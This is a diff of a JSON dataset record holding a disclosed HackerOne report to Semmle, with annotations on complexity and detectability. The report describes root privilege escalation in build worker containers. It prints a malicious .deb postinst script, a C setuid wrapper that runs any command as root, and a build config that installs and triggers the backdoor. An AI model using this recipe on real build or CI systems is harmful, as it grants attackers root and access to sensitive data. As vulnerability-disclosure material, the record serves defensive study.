@@ -1,52 +1,52 @@
 {
-    "reported_to": "Semmle",
-    "reported_by": "testanull ",
-    "title": "Privilege escalation in workers container ",
-    "content": "\nSummary about the bugs:\nIn the prepare step, semmle allows user to install new package.\nBy upload a malicious package along with source code and force server to build this package, attacker will gain root access to the container\nSteps:\nCreate a malicious package contains the backdoor:\nI use this guide (https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/) to create the package.\nWith the content of postinst is\nCode 189 Bytes\n1#!/bin/sh\n2\n3ps -ef\n4sudo cp /opt/src/run /suidfs/passwd && sudo chown root:root /suidfs/passwd && sudo chmod 04755 /suidfs/passwd && ln -s /suidfs/passwd /usr/bin/setpasswd && setpasswd id &\n5\nContent of /opt/src/run:\nCode 97 Bytes\n1#include <stdio.h>\n2void main(int argc, char *argv[]) {\n3    setreuid(0, 0);\n4    system(argv[1]);\n5}\nAfter that i will got a malicious .deb package.\nCreate a config file to install this malicious package:\nBecause the source code is imported before the prepare step happens, so i will be able to install this package by point directly to it like this /opt/src/work.deb.\nThe install command now will be like this apt install -y --no-recommend /opt/src/work.deb. And it is legal.\nThe build config:\nCode 181 Bytes\n1extraction:\n2  java:\n3    prepare:\n4      packages:\n5        - /opt/src/work.deb\n6    after_prepare:\n7      - echo pwned >> /opt/out/snapshot/log/build.log\n8      - /usr/bin/setpasswd 'id'\nAfter that the build will failed, and attacker will get root on the container by running the setuid backdoor\nPoC is attached below\nThanks & regard!\nImpact\nAttacker will get root access and will be able to dump every sensitive datas in the server!\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "Semmle",
+  "reported_by": "testanull ",
+  "title": "Privilege escalation in workers container ",
+  "content": "\nSummary about the bugs:\nIn the prepare step, semmle allows user to install new package.\nBy upload a malicious package along with source code and force server to build this package, attacker will gain root access to the container\nSteps:\nCreate a malicious package contains the backdoor:\nI use this guide (https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/) to create the package.\nWith the content of postinst is\nCode 189 Bytes\n1#!/bin/sh\n2\n3ps -ef\n4sudo cp /opt/src/run /suidfs/passwd && sudo chown root:root /suidfs/passwd && sudo chmod 04755 /suidfs/passwd && ln -s /suidfs/passwd /usr/bin/setpasswd && setpasswd id &\n5\nContent of /opt/src/run:\nCode 97 Bytes\n1#include <stdio.h>\n2void main(int argc, char *argv[]) {\n3    setreuid(0, 0);\n4    system(argv[1]);\n5}\nAfter that i will got a malicious .deb package.\nCreate a config file to install this malicious package:\nBecause the source code is imported before the prepare step happens, so i will be able to install this package by point directly to it like this /opt/src/work.deb.\nThe install command now will be like this apt install -y --no-recommend /opt/src/work.deb. And it is legal.\nThe build config:\nCode 181 Bytes\n1extraction:\n2  java:\n3    prepare:\n4      packages:\n5        - /opt/src/work.deb\n6    after_prepare:\n7      - echo pwned >> /opt/out/snapshot/log/build.log\n8      - /usr/bin/setpasswd 'id'\nAfter that the build will failed, and attacker will get root on the container by running the setuid backdoor\nPoC is attached below\nThanks & regard!\nImpact\nAttacker will get root access and will be able to dump every sensitive datas in the server!\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 1500,
+  "weaknesses": [
+    "Privilege Escalation"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1569389460,
+  "report_url": "https://hackerone.com/reports/692603",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Create a malicious .deb package with a postinst script that sets up a SUID backdoor"
     ],
-    "bounty": 1500,
-    "weaknesses": [
-        "Privilege Escalation"
+    [
+      2,
+      "Configure the build process to install the malicious package during the prepare step"
     ],
-    "screenshots": {},
-    "disclosed_date": 1569389460,
-    "report_url": "https://hackerone.com/reports/692603",
-    "is_multi_component": true,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "CODE",
-    "steps": [
-        [
-            1,
-            "Create a malicious .deb package with a postinst script that sets up a SUID backdoor"
-        ],
-        [
-            2,
-            "Configure the build process to install the malicious package during the prepare step"
-        ],
-        [
-            3,
-            "Trigger the build process to execute the backdoor and gain root access"
-        ]
-    ],
-    "vuln_description": "The vulnerability allows privilege escalation in a workers container by exploiting the ability to install custom packages during the prepare step. An attacker can upload a malicious package that creates a SUID binary, granting root access when executed.",
-    "reason": "This attack requires understanding of package creation, SUID exploitation, and build process manipulation. While the components are known techniques, their combination in this specific context requires careful coordination.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": false,
-    "authnz_byppass_detectable": false,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": false,
-        "authnz_byppass_detectable": false
-    }
+    [
+      3,
+      "Trigger the build process to execute the backdoor and gain root access"
+    ]
+  ],
+  "vuln_description": "The vulnerability allows privilege escalation in a workers container by exploiting the ability to install custom packages during the prepare step. An attacker can upload a malicious package that creates a SUID binary, granting root access when executed.",
+  "reason": "This attack requires understanding of package creation, SUID exploitation, and build process manipulation. While the components are known techniques, their combination in this specific context requires careful coordination.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": false,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves privilege escalation within a container by installing a malicious package during the build process. This is not an authentication or authorization issue that can be detected by swapping user sessions or resource IDs, as it occurs at the system level during the build phase and does not involve HTTP request/response interactions.",
+    "is_detectable": false
+  }
 }
